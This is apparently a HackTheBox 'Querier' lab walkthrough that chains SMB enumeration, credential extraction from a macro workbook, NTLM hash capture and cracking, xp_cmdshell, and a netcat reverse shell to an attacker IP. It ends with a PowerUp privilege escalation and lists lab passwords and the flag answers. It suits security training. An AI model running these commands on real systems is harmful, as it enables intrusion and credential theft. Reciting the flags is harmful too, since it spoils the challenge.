# Querier - Medium

```shell
nmap -T4 -p- -A -Pn -v 10.10.10.125

smbclient -L \\\\10.10.10.125

smbclient \\\\10.10.10.125\\Reports

mget *
#get the xlsm file

binwalk "Currency Volume Report.xlsm"
#shows several files inside

binwalk -e "Currency Volume Report.xlsm"
#extracts to a directory
#go through all files

#inside extracted folders
cd xl

ls -la

strings vbaProject.bin
#gives uid and password
#we can use this to log into mssql service

mssqlclient.py reporting@10.10.10.125 -windows-auth

#in mssql client
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
#view current user permissions

SELECT name FROM master.dbo.sysdatabases;
#view table names

#in another tab, start responder
sudo responder -I tun0

#in mssqlclient
xp_dirtree '\\10.10.14.2\myshare';

#in attacker machine
vim ntlmhash.txt
#copy the complete hash captured by responder

hashcat -a 0 -m 5600 ntlmv2hash.txt /usr/share/wordlists/rockyou.txt
#crack the hash

#log into mssqlclient with new creds
mssqlclient.py mssql-svc@10.10.10.125 -windows-auth

SELECT * FROM fn_my_permissions(NULL, 'SERVER');
#we have more privileges now

help
#view extra commands

enable_xp_cmdshell

xp_cmdshell whoami
#it works

#in attacker machine
python3 -m http.server

#setup listener
nc -nvlp 4444

#in mssqlclient
xp_cmdshell "powershell.exe wget http://10.10.14.2:8000/nc.exe -OutFile c:\\Users\Public\\nc.exe"
#downloads the netcat binary

xp_cmdshell  "c:\\Users\Public\\nc.exe -e cmd.exe 10.10.14.2 4444"
#this gives us reverse shell on listener

whoami
#mssql-svc
#we can get user flag

powershell -ep bypass

IWR http://10.10.14.2:8000/PowerUp.ps1 -OutFile PowerUp.ps1

. .\PowerUp.ps1
#this uses Invoke-AllChecks
#gives us Administrator password in cached GPP files

evil-winrm -i 10.10.10.125 -u Administrator -p "MyUnclesAreMarioAndLuigi\!\!1\!"
#escape chars
#get root flag
```

* Open ports & services:

  * 135 - msrpc - Microsoft Windows RPC
  * 445 - microsoft-ds
  * 1433 - ms-sql-s - Microsoft SQL Server 2017
  * 5985 - http - Microsoft HTTPAPI httpd 2.0
  * 8732 - dtp-net
  * 47001 - http
  * 49664-49671 - msrpc - Microsoft Windows RPC

* While enumerating SMB shares, we get a 'reports' share - we can check for files inside.

* The share contains a .xlsm file - which is an Excel macro-enabled workbook.

* We cannot open it as a spreadsheet, but we can extract the files inside it using ```binwalk```.

* One of the files in the extracted folders, vbaProject.bin, contains interesting info which can be viewed using ```strings```.

* Using this, we get the uid 'reporting' and password 'PcwTWTHRwryjc$c6'.

* With these creds, we can log into the MSSQL service; we will be using the client provided by impacket.

* We can begin enumeration in MSSQL using ```mssqlclient.py```, but we do not get anything.

* We can attempt to capture NTLM hashes using the mssqlclient and ```responder```; we need to use ```xp_dirtree``` in the mssqlclient to access a SMB share which does not exist.

* This helps ```responder``` to fetch NTLMv2-SSP hash for user 'mssql-svc'; we can crack the hash using ```hashcat```

* Cracking the hash gives us the password 'corporate568' for user mssql-svc; we can log into the MSSQL service with these creds.

* As we have more privileges now, we can attempt to execute commands using ```xp_cmdshell```.

* ```xp_cmdshell``` works, so we can proceed to get a reverse shell using netcat.

* After setting up our listener, downloading netcat and executing the command on mssqlclient, we get reverse shell as mssql-svc.

* We can use ```PowerUp``` for enumeration; ```certutil``` does not work, so we can load PS and use ```Invoke-WebRequest``` instead.

* In PowerShell, we can run the PowerUp script and use ```Invoke-AllChecks``` module.

* The output shows cached GPP files - this includes the password "MyUnclesAreMarioAndLuigi!!1!" for Administrator user.

* So, we can use these creds to login as Admin and get root flag.

```markdown
1. User flag - ff392c362b6e3491b80eaa576caea8b3

2. Root flag - 25aa3e742c87c6737a89838c822d52f4
```
